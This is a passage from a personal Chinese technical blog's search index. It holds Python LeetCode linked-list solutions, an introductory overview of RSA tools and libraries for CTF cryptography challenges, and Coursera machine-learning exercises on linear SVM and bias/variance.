while b and b.next and a.next.val==b.next.val: b = b.next a.next = b.next b = b.next return dummy.nextif __name__==\"__main__\": a=[-1,1,1,2,4] new_a=createLink_rearinsert(a) a1 = Solution() p=a1.deleteDuplicates(new_a) list1=[] while(p!=None): list1.append(p.val) #print(p.val) p=p.next print(list1) [-1, 2, 4]方法3:12345678910111213141516171819202122232425262728293031323334353637383940414243444546# Definition for singly-linked list.class ListNode: def __init__(self, x): self.val = x self.next = Nonedef createLink_rearinsert(lista): head = ListNode(-1) rear = head for i in lista: new_node=ListNode(i) rear.next=new_node rear=new_node return head.nextclass Solution(object): def deleteDuplicates(self, head): if not (head and head.next): return head dummy = ListNode(-1) dummy.next = head a = dummy b = head.next while b: if a.next.val!=b.val: a = a.next b = b.next else: while b and a.next.val==b.val: b = b.next # 这里的去重跟解法二有点差别，解法二的是 # a.next = b.next a.next = b # b指针在while中判断完后，可能指向了null，这里需要处理边界问题 b = b.next if b else None return dummy.nextif __name__==\"__main__\": a=[-1,1,1,2,4] new_a=createLink_rearinsert(a) a1 = Solution() p=a1.deleteDuplicates(new_a) list1=[] while(p!=None): list1.append(p.val) #print(p.val) p=p.next print(list1) [-1, 2, 4]","categories":[{"name":"数据结构与算法","slug":"数据结构与算法","permalink":"https://fishni.github.io/categories/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95/"}],"tags":[{"name":"python","slug":"python","permalink":"https://fishni.github.io/tags/python/"},{"name":"数据结构与算法","slug":"数据结构与算法","permalink":"https://fishni.github.io/tags/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95/"},{"name":"链表","slug":"链表","permalink":"https://fishni.github.io/tags/%E9%93%BE%E8%A1%A8/"}]},{"title":"【数据结构与算法】【LeetCode】【链表】21.合并两个有序链表","slug":"LeetCode-A-链表-21. 合并两个有序链表","date":"2020-11-11T16:00:00.000Z","updated":"2020-11-13T01:24:40.735Z","comments":true,"path":"2020/11/12/LeetCode-A-链表-21. 合并两个有序链表/","link":"","permalink":"https://fishni.github.io/2020/11/12/LeetCode-A-%E9%93%BE%E8%A1%A8-21.%20%E5%90%88%E5%B9%B6%E4%B8%A4%E4%B8%AA%E6%9C%89%E5%BA%8F%E9%93%BE%E8%A1%A8/","excerpt":"LeetCode，合并两个有序链表","text":"LeetCode，合并两个有序链表 题目将两个升序链表合并为一个新的 升序 链表并返回。新链表是通过拼接给定的两个链表的所有节点组成的。 示例： 输入：1-&gt;2-&gt;4, 1-&gt;3-&gt;4 输出：1-&gt;1-&gt;2-&gt;3-&gt;4-&gt;4 解题递归法1234567891011121314151617181920212223242526272829303132333435363738394041#Definition for singly-linked list.class ListNode: def __init__(self, val=0, next=None): self.val = val self.next = nextclass Solution: def mergeTwoLists(self, l1, l2): if l1 is None: return l2 elif l2 is None: return l1 elif l1.val &lt; l2.val: l1.next = self.mergeTwoLists(l1.next, l2) return l1 else: l2.next = self.mergeTwoLists(l1, l2.next) return l2def createLink(lista): head = ListNode(1) rear =head for i in range(1,len(lista)): new = ListNode(lista[i]) rear.next=new rear = new return headif __name__==\"__main__\": a=[1,2,4] b=[1,3,4] l1=createLink(a) l2=createLink(b) #l1=ListNode(1,ListNode(2,ListNode(4))) #l2=ListNode(1,ListNode(3,ListNode(4))) a1 = Solution() p=a1.mergeTwoLists(l1,l2) list1=[] while(p!=None): list1.append(p.val) #print(p.val) p=p.next print(list1) [1, 1, 2, 3, 4, 4]迭代法123456789101112131415161718192021222324252627282930313233343536373839404142434445464748class ListNode: def __init__(self, val=0, next=None): self.val = val self.next = next class Solution: def mergeTwoLists(self, l1, l2): prehead = ListNode(-1) prev = prehead while l1 and l2: if l1.val &lt;= l2.val: prev.next = l1 l1 = l1.next else: prev.next = l2 l2 = l2.next prev = prev.next # 合并后 l1 和 l2 最多只有一个还未被合并完，我们直接将链表末尾指向未合并完的链表即可 prev.next = l1 if l1 is not None else l2 return prehead.nextdef createLink(lista): head = ListNode(1) rear =head for i in range(1,len(lista)): new = ListNode(lista[i]) rear.next=new rear = new return headif __name__==\"__main__\": a=[1,2,4] b=[1,3,4] l1=createLink(a) l2=createLink(b) #l1=ListNode(1,ListNode(2,ListNode(4))) #l2=ListNode(1,ListNode(3,ListNode(4))) a1 = Solution() p=a1.mergeTwoLists(l1,l2) list1=[] while(p!=None): list1.append(p.val) #print(p.val) p=p.next print(list1) [1, 1, 2, 3, 4, 4]","categories":[{"name":"数据结构与算法","slug":"数据结构与算法","permalink":"https://fishni.github.io/categories/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95/"}],"tags":[{"name":"python","slug":"python","permalink":"https://fishni.github.io/tags/python/"},{"name":"数据结构与算法","slug":"数据结构与算法","permalink":"https://fishni.github.io/tags/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95/"},{"name":"链表","slug":"链表","permalink":"https://fishni.github.io/tags/%E9%93%BE%E8%A1%A8/"}]},{"title":"【Crypto-CTF】RSA常用工具及python库说明","slug":"Crypto-RSA工具和常用python库说明","date":"2020-10-29T16:00:00.000Z","updated":"2020-11-09T07:28:53.694Z","comments":true,"path":"2020/10/30/Crypto-RSA工具和常用python库说明/","link":"","permalink":"https://fishni.github.io/2020/10/30/Crypto-RSA%E5%B7%A5%E5%85%B7%E5%92%8C%E5%B8%B8%E7%94%A8python%E5%BA%93%E8%AF%B4%E6%98%8E/","excerpt":"本文介绍了在CTF比赛中密码学中常用的工具及python库：简要讲解了安装方法，常用的使用方法。","text":"本文介绍了在CTF比赛中密码学中常用的工具及python库：简要讲解了安装方法，常用的使用方法。 RSA常用工具RSAtool 任意给定两个素数（p，q）或者（模数n，私钥d）都可以计算出RSA（p,q,n,d,e）及RSA-CRT (dP, dQ, qInv) 返回参数可以以pem或der文件格式保存私钥文件 安装 git clone https://github.com/ius/rsatool.git cd rsatool 使用 根据p，q生成私钥文件key.pem python rsatool.py -f PEM -o key.pem -n 13826123222358393307 -d 9793706120266356337 Using (n, d) to initialise RSA instance n = 13826123222358393307 (0xbfe041d1197381db) e = 65537 (0x10001) d = 9793706120266356337 (0x87ea3bd3bd0b9671) p = 4184799299 (0xf96ef843) q = 3303891593 (0xc4ed6289) Saving PEM as key.pem 提供（p,q）生成key.der python rsatool.py -f DER -o key.der -p 4184799299 -q 3303891593 Using (p, q) to initialise RSA instance n = 13826123222358393307 (0xbfe041d1197381db) e = 65537 (0x10001) d = 9793706120266356337 (0x87ea3bd3bd0b9671) p = 4184799299 (0xf96ef843) q = 3303891593 (0xc4ed6289) Saving DER as key.der opensslopenssl可以查看公钥得到n和e，也可以利用私钥文件解密公钥加密的内容 安装 kail中自带 windows下可安装：OpenSSL-Win32 使用 查看公钥文件 openssl rsa -pubin -in pubkey.pem -text -modulus 解密 rsautl -decrypt -inkey private.pem -in flag.enc -out flag 整数分解工具网站分解：http://factordb.com/命令行分解：factordb-pycli，借用 factordb 数据库：https://github.com/ryosan-470/factordb-python安装FactorDB存储了已经知道的整数的分解，这个工具可以在命令行上使用，对python2和python3也适用 本地对应pip安装即可： pip3 install factordb-python 更新factordb-python pip3 install --upgrade factordb-python 使用 命令行使用 C:\\Users\\fishmouse&gt;factordb 16 2 2 2 2 获得更多信息： C:\\Users\\fishmouse&gt;factordb --json 16 {\"id\": \"http://factordb.com/api/?id=2\", \"status\": \"FF\", \"factors\": [2, 2, 2, 2]} FacotrDB库的使用 12from factordb.factordb import FactorDBf = FactorDB(16) 1f.get_factor_list() []1f.connect() &lt;Response [200]&gt;1f.get_factor_list() [2, 2, 2, 2]1f.get_factor_from_api() [[&apos;2&apos;, 4]]1f.get_status() &apos;FF&apos;yafu本地分解windows下使用 xxx\\yafu-1.34&gt; .\\yafu-x64.exe factor(21) RSA常用python库gmpy2windows下安装 whl文件形式安装,下载对应python版本的whl文件：https://www.lfd.uci.edu/~gohlke/pythonlibs/ pip3 install gmpy2-2.0.8-cp37-cp37m-win_amd64.whl kail中安装安装gmpy2这个库还需要一些相应的环境mpfr和mpc 首先安装mpfr，因为要安装mpc必须先安装mpfr root@kali:~# wget https://www.mpfr.org/mpfr-current/mpfr-4.1.0.tar.bz2 若失败到官网：https://www.mpfr.org/mpfr-current查看最新 root@kali:~# tar -jxvf mpfr-4.1.0.tar.bz2 root@kali:~# cd mpfr-4.1.0 root@kali:~/mpfr-4.1.0# ./configure root@kali:~/mpfr-4.1.0# make &amp;&amp; make check &amp;&amp; make install 安装mpc root@kali:~# wget ftp://ftp.gnu.org/gnu/mpc/mpc-1.1.0.tar.gz root@kali:~# tar -zxvf mpc-1.1.0.tar.gz &amp;&amp; cd mpc-1.1.0 root@kali:~/mpc-1.1.0# ./configure root@kali:~/mpc-1.1.0# make &amp;&amp; make check &amp;&amp; make install 安装gmpy2 root@kali:~# pip3 install gmpy2 常用函数gmpy2.gcd最大公约数12import gmpy2gmpy2.gcd(2,4) mpz(2)gmpy2.invert求逆元1gmpy2.invert(5,26) mpz(21)gmpy2.gcdext求逆元1gmpy2.gcdext(5,26)#传入（a,b）;返回最大公约数、x、y :g= ax+by (mpz(1), mpz(-5), mpz(1))gmpy2.iroot开次方根1gmpy2.iroot(4,2) (mpz(2), True)libnumpip安装pip3 install libnum 常用函数libnum.gcd求最大公约数12import libnumlibnum.gcd(2,4) 2libnum.invmod求逆元1libnum.invmod(5,26) 21libnum.xgcd扩展欧几里得1libnum.xgcd(5,26)# xgcd(a,b)返回：x,y,g ；ax+by=g (-5, 1, 1)libnum.s2n字符串转为整数1libnum.s2n(\"hell0\") 448378203184libnum.n2s整数转换为字符串1libnum.n2s(448378203184) &apos;hell0&apos;pycryptodomepip安装pip3 install pycryptodome 安装后，可以使用Crypto这个模块，注意点：在对应python下的库Lib\\site-packages中crypto开头为小写时，将其改为Crypto即可 小结整数到字符串（字节串的相互转换）整数和字符串123# 字符串到整数import libnumlibnum.s2n(\"hello\") 44837820324712# 整数到字符串libnum.n2s(448378203247) &apos;hello&apos;整数和字节串123# 字节串到整数from Crypto.Util.number import long_to_bytes,bytes_to_longbytes_to_long('hello'.encode()) 44837820324712# 整数到字节串long_to_bytes(448378203247) b&apos;hello&apos;素数产生脚本123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051# 检测大整数是否是素数,如果是素数,就返回True,否则返回False# miller_rabin算法import randomdef rabin_miller(num): s = num - 1 t = 0 while s % 2 == 0: s = s // 2 t += 1 for trials in range(5): a = random.randrange(2, num - 1) v = pow(a, s, num) if v != 1: i = 0 while v != (num - 1): if i == t - 1: return False else: i = i + 1 v = (v ** 2) % num return Truedef is_prime(num): # 排除0,1和负数 if num &lt; 2: return False # 创建小素数的列表,可以大幅加快速度 # 如果是小素数,那么直接返回true small_primes = [2, 3, 5, 7, 11, 13, 17, 19, 23, 29, 31, 37, 41, 43, 47, 53, 59, 61, 67, 71, 73, 79, 83, 89, 97, 101, 103, 107, 109, 113, 127, 131, 137, 139, 149, 151, 157, 163, 167, 173, 179, 181, 191, 193, 197, 199, 211, 223, 227, 229, 233, 239, 241, 251, 257, 263, 269, 271, 277, 281, 283, 293, 307, 311, 313, 317, 331, 337, 347, 349, 353, 359, 367, 373, 379, 383, 389, 397, 401, 409, 419, 421, 431, 433, 439, 443, 449, 457, 461, 463, 467, 479, 487, 491, 499, 503, 509, 521, 523, 541, 547, 557, 563, 569, 571, 577, 587, 593, 599, 601, 607, 613, 617, 619, 631, 641, 643, 647, 653, 659, 661, 673, 677, 683, 691, 701, 709, 719, 727, 733, 739, 743, 751, 757, 761, 769, 773, 787, 797, 809, 811, 821, 823, 827, 829, 839, 853, 857, 859, 863, 877, 881, 883, 887, 907, 911, 919, 929, 937, 941, 947, 953, 967, 971, 977, 983, 991, 997] if num in small_primes: return True # 如果大数是这些小素数的倍数,那么就是合数,返回false for prime in small_primes: if num % prime == 0: return False # 如果这样没有分辨出来,就一定是大整数,那么就调用rabin算法 return rabin_miller(num)# 得到大整数,默认位数为1024def get_prime(key_size=1024): while True: num = random.randrange(2**(key_size-1), 2**key_size) if is_prime(num): return numprint(get_prime(50)) 602912217591119libnum12import libnumlibnum.generate_prime(30) 9365521311libnum.generate_prime_from_string(\"abc\") 418262526581Crypto.Util.number12from Crypto.Util.number import getPrimegetPrime(30) 930767861rsa库简单使用密钥生成123import rsa(pubkey, privkey) = rsa.newkeys(128)pubkey,privkey (PublicKey(210654150686773160921155565886246123127, 65537), PrivateKey(210654150686773160921155565886246123127, 65537, 45430608142070156598272456648718438625, 245259021963773848463, 858904797874827929))rsa加密12m = \"hello\".encode('utf-8')rsa.encrypt(m,pubkey) b&apos;]\\xd6\\xb2w\\xc4\\x89[\\xfcu`\\x0b&amp;\\xa0\\xc9`\\xd2&apos;rsa解密1rsa.decrypt(b']\\xd6\\xb2w\\xc4\\x89[\\xfcu`\\x0b&amp;\\xa0\\xc9`\\xd2',privkey) b&apos;hello&apos;公钥文件查看方式opensslopenssl rsa -pubin -in pubkey.pem -text -modulus rsa库123456import rsawith open('publickey.pem',mode='rb') as f: keydata= f.read()pubckey = rsa.PublicKey.load_pkcs1_openssl_pem(keydata)pubckey.npubckey.e 私钥文件生成方式rsatool.pypython rsatool.py -f PEM -o prvkey.pem -p 4184799299 -q 3303891593 from Crypto.PublicKey import RSA123456789101112# coding=utf-8import mathimport sysfrom Crypto.PublicKey import RSArsa_components=(n,e,int(d),p,q)keypair=RSA.construct(rsa_components)private = open('private.pem', 'wb')private.write(keypair.exportKey())private.close() 根据私钥文件读取公钥加密后密文方式利用rsa库直接读1234import rsaprikey = rsa.PrivateKey(n , e , d , p , q)with open(\"test.enc\" , \"rb\") as fp: print(rsa.decrypt(fp.read(), prikey).decode()) 利用opensslOpenSSL&gt; rsautl -decrypt -in test.enc -inkey private.pem 字符串异或Crypto.Util import strxor12from Crypto.Util import strxorstrxor(b&quot;hhh&quot;,b&quot;aaa&quot;)","categories":[{"name":"密码学","slug":"密码学","permalink":"https://fishni.github.io/categories/%E5%AF%86%E7%A0%81%E5%AD%A6/"}],"tags":[{"name":"python","slug":"python","permalink":"https://fishni.github.io/tags/python/"},{"name":"密码学","slug":"密码学","permalink":"https://fishni.github.io/tags/%E5%AF%86%E7%A0%81%E5%AD%A6/"},{"name":"Crypto-CTF","slug":"Crypto-CTF","permalink":"https://fishni.github.io/tags/Crypto-CTF/"},{"name":"RSA","slug":"RSA","permalink":"https://fishni.github.io/tags/RSA/"}]},{"title":"【吴恩达机器学习】线性SVM-01","slug":"ML-006线性SVM-1","date":"2020-07-13T16:00:00.000Z","updated":"2020-07-18T03:14:21.091Z","comments":true,"path":"2020/07/14/ML-006线性SVM-1/","link":"","permalink":"https://fishni.github.io/2020/07/14/ML-006%E7%BA%BF%E6%80%A7SVM-1/","excerpt":"本文是对线性SVM实践性理解，利用sklearn.svm中的LinearSVC。此外参考链接给出了几个较为详细的SVM原理理解。","text":"本文是对线性SVM实践性理解，利用sklearn.svm中的LinearSVC。此外参考链接给出了几个较为详细的SVM原理理解。 数据集操作 导入模块 123456import numpy as npimport pandas as pdimport sklearn.svmimport seaborn as snsimport scipy.io as sioimport matplotlib.pyplot as plt 加载数据集 12mat = sio.loadmat('./data/ex6data1.mat')mat {&apos;__header__&apos;: b&apos;MATLAB 5.0 MAT-file, Platform: GLNXA64, Created on: Sun Nov 13 14:28:43 2011&apos;, &apos;__version__&apos;: &apos;1.0&apos;, &apos;__globals__&apos;: [], &apos;X&apos;: array([[1.9643 , 4.5957 ], [2.2753 , 3.8589 ], [2.9781 , 4.5651 ], [2.932 , 3.5519 ], [3.5772 , 2.856 ], [4.015 , 3.1937 ], [3.3814 , 3.4291 ], [3.9113 , 4.1761 ], [2.7822 , 4.0431 ], [2.5518 , 4.6162 ], [3.3698 , 3.9101 ], [3.1048 , 3.0709 ], [1.9182 , 4.0534 ], [2.2638 , 4.3706 ], [2.6555 , 3.5008 ], [3.1855 , 4.2888 ], [3.6579 , 3.8692 ], [3.9113 , 3.4291 ], [3.6002 , 3.1221 ], [3.0357 , 3.3165 ], [1.5841 , 3.3575 ], [2.0103 , 3.2039 ], [1.9527 , 2.7843 ], [2.2753 , 2.7127 ], [2.3099 , 2.9584 ], [2.8283 , 2.6309 ], [3.0473 , 2.2931 ], [2.4827 , 2.0373 ], [2.5057 , 2.3853 ], [1.8721 , 2.0577 ], [2.0103 , 2.3546 ], [1.2269 , 2.3239 ], [1.8951 , 2.9174 ], [1.561 , 3.0709 ], [1.5495 , 2.6923 ], [1.6878 , 2.4057 ], [1.4919 , 2.0271 ], [0.962 , 2.682 ], [1.1693 , 2.9276 ], [0.8122 , 2.9992 ], [0.9735 , 3.3881 ], [1.25 , 3.1937 ], [1.3191 , 3.5109 ], [2.2292 , 2.201 ], [2.4482 , 2.6411 ], [2.7938 , 1.9656 ], [2.091 , 1.6177 ], [2.5403 , 2.8867 ], [0.9044 , 3.0198 ], [0.76615 , 2.5899 ], [0.086405, 4.1045 ]]), &apos;y&apos;: array([[1], [1], [1], [1], [1], [1], [1], [1], [1], [1], [1], [1], [1], [1], [1], [1], [1], [1], [1], [1], [0], [0], [0], [0], [0], [0], [0], [0], [0], [0], [0], [0], [0], [0], [0], [0], [0], [0], [0], [0], [0], [0], [0], [0], [0], [0], [0], [0], [0], [0], [1]], dtype=uint8)}123456mat = sio.loadmat('./data/ex6data1.mat')print(mat.keys())data = pd.DataFrame(mat.get('X'), columns=['X1', 'X2'])data['y'] = mat.get('y')data.head() dict_keys([&apos;__header__&apos;, &apos;__version__&apos;, &apos;__globals__&apos;, &apos;X&apos;, &apos;y&apos;]) .dataframe tbody tr th:only-of-type { vertical-align: middle; } .dataframe tbody tr th { vertical-align: top; } .dataframe thead th { text-align: right; } X1 X2 y 0 1.9643 4.5957 1 1 2.2753 3.8589 1 2 2.9781 4.5651 1 3 2.9320 3.5519 1 4 3.5772 2.8560 1 可视化data 注意左边的边界情况 123456fig, ax = plt.subplots(figsize=(8,6))ax.scatter(data['X1'], data['X2'], s=50, c=data['y'], cmap='Reds')ax.set_title('Raw data')ax.set_xlabel('X1')ax.set_ylabel('X2')plt.show() try $C=1$http://scikit-learn.org/stable/modules/generated/sklearn.svm.LinearSVC.html#sklearn.svm.LinearSVC fix(X,y): 训练模型 predict(X): 用模型进行预测，返回预测值 score(X,y[, sample_weight]):返回在(X, y)上预测的准确率 123svc1 = sklearn.svm.LinearSVC(C=1, loss='hinge')svc1.fit(data[['X1', 'X2']], data['y'])svc1.score(data[['X1', 'X2']], data['y']) 0.980392156862745112data['SVM1 Confidence'] = svc1.decision_function(data[['X1', 'X2']])data.head() .dataframe tbody tr th:only-of-type { vertical-align: middle; } .dataframe tbody tr th { vertical-align: top; } .dataframe thead th { text-align: right; } X1 X2 y SVM1 Confidence 0 1.9643 4.5957 1 0.798413 1 2.2753 3.8589 1 0.380796 2 2.9781 4.5651 1 1.372965 3 2.9320 3.5519 1 0.518512 4 3.5772 2.8560 1 0.331923 画出SVM1 confidence图像 1234fig, ax = plt.subplots(figsize=(8,6))ax.scatter(data['X1'], data['X2'], s=50, c=data['SVM1 Confidence'], cmap='RdBu')ax.set_title('SVM (C=1) Decision Confidence')plt.show() try $C=100$对于较大的C，你会尝试过度拟合数据，所以左边的边缘情况现在被归为右边 123svc100 = sklearn.svm.LinearSVC(C=100, loss='hinge')svc100.fit(data[['X1', 'X2']], data['y'])svc100.score(data[['X1', 'X2']], data['y']) 0.98039215686274511data['SVM100 Confidence'] = svc100.decision_function(data[['X1', 'X2']]) 1234fig, ax = plt.subplots(figsize=(8,6))ax.scatter(data['X1'], data['X2'], s=50, c=data['SVM100 Confidence'], cmap='RdBu')ax.set_title('SVM (C=100) Decision Confidence')plt.show() 1data.head() .dataframe tbody tr th:only-of-type { vertical-align: middle; } .dataframe tbody tr th { vertical-align: top; } .dataframe thead th { text-align: right; } X1 X2 y SVM1 Confidence SVM100 Confidence 0 1.9643 4.5957 1 0.798413 3.483024 1 2.2753 3.8589 1 0.380796 1.652665 2 2.9781 4.5651 1 1.372965 4.569583 3 2.9320 3.5519 1 0.518512 1.502287 4 3.5772 2.8560 1 0.331923 0.181774 参考链接 SVM理解参考链接 SVM理解参考链接2：较为细致 从超平面到SVM（一） 从超平面到SVM（二）","categories":[{"name":"人工智能","slug":"人工智能","permalink":"https://fishni.github.io/categories/%E4%BA%BA%E5%B7%A5%E6%99%BA%E8%83%BD/"}],"tags":[{"name":"python","slug":"python","permalink":"https://fishni.github.io/tags/python/"},{"name":"SVM","slug":"SVM","permalink":"https://fishni.github.io/tags/SVM/"}]},{"title":"【吴恩达机器学习】练习5-方差与偏差","slug":"ML-005偏差和方差-Exercise5","date":"2020-07-06T16:00:00.000Z","updated":"2020-07-11T06:20:04.257Z","comments":true,"path":"2020/07/07/ML-005偏差和方差-Exercise5/","link":"","permalink":"https://fishni.github.io/2020/07/07/ML-005%E5%81%8F%E5%B7%AE%E5%92%8C%E6%96%B9%E5%B7%AE-Exercise5/","excerpt":"对于这个练习，了解泛化误差中的方差和偏差","text":"对于这个练习，了解泛化误差中的方差和偏差 本章代码涵盖了基于Python的解决方案，用于Coursera机器学习课程的第五个编程练习。 请参考练习文本了解详细的说明和公式。 导入模块 Numpy：为大型多维数组和矩阵添加 Python 支持，并提供高级的数学函数来运算这些数组。 SciPy：基于 Numpy，汇集了一系列的数学算法和便捷的函数。它可以向开发者提供用于数据操作与可视化的高级命令和类，是构建交互式 Python 会话的强大工具。 Pandas：面向数据操作和分析的 Python 库，提供用于处理数字图表和时序数据的数据结构和操作功能。 Matplotlib：Python 中常用的绘图库，能在跨平台的交互式环境生成高质量图形。后来在它的基础上又衍生了更为高级的绘图库 Seaborn。 总的来说，如果你想理解和处理手头的数据，就用 Pandas；如果你想执行一些复杂的计算，就用 Numpy 和 SciPy；如果你想将数据可视化，就用 Matplotlib。 123456import numpy as npimport scipy.io as sioimport scipy.optimize as optimport pandas as pdimport matplotlib.pyplot as pltimport seaborn as sns 加载数据 map简单示例 map() 会根据提供的函数对指定序列做映射。 第一个参数 function 以参数序列中的每一个元素调用 function 函数，返回包含每次 function 函数返回值的新列表 map(function, iterable, …)Python 3.x 返回迭代器 1map(lambda x, y: x + y, [1, 3, 5, 7, 9], [2, 4, 6, 8, 10]) &lt;map at 0x18734e11a08&gt;1list(map(lambda x, y: x + y, [1, 3, 5, 7, 9], [2, 4, 6, 8, 10])) [3, 7, 11, 15, 19]1list(map(lambda x: x ** 2, [1, 2, 3, 4, 5])) [1, 4, 9, 16, 25] 加载数据 12d = sio.loadmat('ex5data1.mat')list(map(np.ravel, [d['X'], d['y'], d['Xval'], d['yval'], d['Xtest'], d['ytest']])) [array([-15.93675813, -29.15297922, 36.18954863, 37.49218733, -48.05882945, -8.94145794, 15.30779289, -34.70626581, 1.38915437, -44.38375985, 7.01350208, 22.76274892]), array([ 2.13431051, 1.17325668, 34.35910918, 36.83795516, 2.80896507, 2.12107248, 14.71026831, 2.61418439, 3.74017167, 3.73169131, 7.62765885, 22.7524283 ]), array([-16.74653578, -14.57747075, 34.51575866, -47.01007574, 36.97511905, -40.68611002, -4.47201098, 26.53363489, -42.7976831 , 25.37409938, -31.10955398, 27.31176864, -3.26386201, -1.81827649, -40.7196624 , -50.01324365, -17.41177155, 3.5881937 , 7.08548026, 46.28236902, 14.61228909]), array([ 4.17020201e+00, 4.06726280e+00, 3.18730676e+01, 1.06236562e+01, 3.18360213e+01, 4.95936972e+00, 4.45159880e+00, 2.22763185e+01, -4.38738274e-05, 2.05038016e+01, 3.85834476e+00, 1.93650529e+01, 4.88376281e+00, 1.10971588e+01, 7.46170827e+00, 1.47693464e+00, 2.71916388e+00, 1.09269007e+01, 8.34871235e+00, 5.27819280e+01, 1.33573396e+01]), array([-33.31800399, -37.91216403, -51.20693795, -6.13259585, 21.26118327, -40.31952949, -14.54153167, 32.55976024, 13.39343255, 44.20988595, -1.14267768, -12.76686065, 34.05450539, 39.22350028, 1.97449674, 29.6217551 , -23.66962971, -9.01180139, -55.94057091, -35.70859752, 9.51020533]), array([ 3.31688953, 5.39768952, 0.13042984, 6.1925982 , 17.08848712, 0.79950805, 2.82479183, 28.62123334, 17.04639081, 55.38437334, 4.07936733, 8.27039793, 31.32355102, 39.15906103, 8.08727989, 24.11134389, 2.4773548 , 6.56606472, 6.0380888 , 4.69273956, 10.83004606])]1d['X'].shape (12, 1)1d['y'] array([[ 2.13431051], [ 1.17325668], [34.35910918], [36.83795516], [ 2.80896507], [ 2.12107248], [14.71026831], [ 2.61418439], [ 3.74017167], [ 3.73169131], [ 7.62765885], [22.7524283 ]])加载函数12345678def load_data(): \"\"\"for ex5 d['X'] shape = (12, 1) pandas has trouble taking this 2d ndarray to construct a dataframe, so I ravel the results \"\"\" d = sio.loadmat('ex5data1.mat') return map(np.ravel, [d['X'], d['y'], d['Xval'], d['yval'], d['Xtest'], d['ytest']]) 1X, y, Xval, yval, Xtest, ytest = load_data() 构造df数据帧（DataFrame）12df = pd.DataFrame(&#123;'water_level':X, 'flow':y&#125;)#字典构造 ：数据帧(DataFrame)是二维数据结构，即数据以行和列的表格方式排列df .dataframe tbody tr th:only-of-type { vertical-align: middle; } .dataframe tbody tr th { vertical-align: top; } .dataframe thead th { text-align: right; } water_level flow 0 -15.936758 2.134311 1 -29.152979 1.173257 2 36.189549 34.359109 3 37.492187 36.837955 4 -48.058829 2.808965 5 -8.941458 2.121072 6 15.307793 14.710268 7 -34.706266 2.614184 8 1.389154 3.740172 9 -44.383760 3.731691 10 7.013502 7.627659 11 22.762749 22.752428 seaborn.lmplot（回归图）12sns.lmplot('water_level', 'flow', data=df, fit_reg=False, size=5)plt.show() 12sns.lmplot('water_level', 'flow', data=df, fit_reg=True, size=5)plt.show() 1X, Xval, Xtest = [np.insert(x.reshape(x.shape[0], 1), 0, np.ones(x.shape[0]), axis=1) for x in (X, Xval, Xtest)] 1X array([[ 1. , -15.93675813], [ 1. , -29.15297922], [ 1. , 36.18954863], [ 1. , 37.49218733], [ 1. , -48.05882945], [ 1. , -8.94145794], [ 1. , 15.30779289], [ 1. , -34.70626581], [ 1. , 1.38915437], [ 1. , -44.38375985], [ 1. , 7.01350208], [ 1. , 22.76274892]])代价函数$$J(\\theta)= \\frac{1}{2m}\\sum_{i=1}^{m}(h_{\\theta}(x^{(i)})-y^{(i)})^2$$ 1234567891011121314151617def cost(theta, X, y): \"\"\" X: R(m*n), m records, n features y: R(m) theta : R(n), linear regression parameters \"\"\" m = X.shape[0] inner = X @ theta - y # R(m*1) # 1*m @ m*1 = 1*1 in matrix multiplication # but you know numpy didn't do transpose in 1d array, so here is just a # vector inner product to itselves square_sum = inner.T @ inner cost = square_sum / (2 * m) return cost 12345678def cost(theta, X, y): m = X.shape[0] inner = X@ theta - y square_sum = inner.T@ inner cost = square_sum / (2*m) return cost 123theta = np.ones(X.shape[1])cost(theta, X, y) 303.9515255535976 @符号可以表示矩阵的乘法 123a = np.array([[1,3],[2,4]])b = np.array([[2,1],[3,3]])a @ b array([[11, 10], [16, 14]])梯度$$ \\theta_j := \\theta_j - \\alpha \\frac{\\partial J(\\theta)}{\\partial \\theta_j}$$ 123456def gradient(theta, X, y): m = X.shape[0] inner = X.T @ (X @ theta - y) # (m,n).T @ (m, 1) -&gt; (n, 1) return inner / m 1gradient(theta, X, y) array([-15.30301567, 598.16741084])正则化梯度$$\\frac{\\partial J(\\theta)}{\\partial \\theta_0} = \\frac{1}{m}\\sum_{i=1}^{m}(h_{\\theta}(x^{(i)})-y^{(i)})x_j^{(i)} ~ for ~j =0$$$$\\frac{\\partial J(\\theta)}{\\partial \\theta_j} = (\\frac{1}{m}\\sum_{i=1}^{m}(h_{\\theta}(x^{(i)})-y^{(i)})x_j^{(i)})+\\frac{\\lambda}{m}\\theta_j ~ for ~j \\geq 1$$ 12345678910# L2-normdef regularized_gradient(theta, X, y, l=1): m = X.shape[0] regularized_term = theta.copy() # same shape as theta 产生与theta相同的shape regularized_term[0] = 0 # don't regularize intercept theta 截距不正则化 regularized_term = (l / m) * regularized_term return gradient(theta, X, y) + regularized_term 1regularized_gradient(theta, X, y) array([-15.30301567, 598.25074417])拟合数据 正则化项 $\\lambda=0$ 1234567891011121314151617181920def linear_regression_np(X, y, l=1): \"\"\"linear regression args: X: feature matrix, (m, n+1) # with incercept x0=1 y: target vector, (m, ) l: lambda constant for regularization return: trained parameters \"\"\" # init theta theta = np.ones(X.shape[1]) # train it res = opt.minimize(fun=regularized_cost, x0=theta, args=(X, y, l), method='TNC', jac=regularized_gradient, options=&#123;'disp': True&#125;) return res 1234567def regularized_cost(theta, X, y, l=1): m = X.shape[0] regularized_term = (l / (2 * m)) * np.power(theta[1:], 2).sum() return cost(theta, X, y) + regularized_term 123theta = np.ones(X.shape[0])final_theta = linear_regression_np(X, y, l=0).get('x') 1234567b = final_theta[0] # interceptm = final_theta[1] # slopeplt.scatter(X[:,1], y, label=\"Training data\")plt.plot(X[:, 1], X[:, 1]*m + b, label=\"Prediction\")plt.legend(loc=2)plt.show() 1training_cost, cv_cost = [], [] 1.使用训练集的子集来拟合应模型 2.在计算训练代价和交叉验证代价时，没有用正则化 3.记住使用相同的训练集子集来计算训练代价 1234567891011m = X.shape[0]for i in range(1, m+1):# print('i=&#123;&#125;'.format(i)) res = linear_regression_np(X[:i, :], y[:i], l=0) tc = regularized_cost(res.x, X[:i, :], y[:i], l=0) cv = regularized_cost(res.x, Xval, yval, l=0)# print('tc=&#123;&#125;, cv=&#123;&#125;'.format(tc, cv)) training_cost.append(tc) cv_cost.append(cv) 1234plt.plot(np.arange(1, m+1), training_cost, 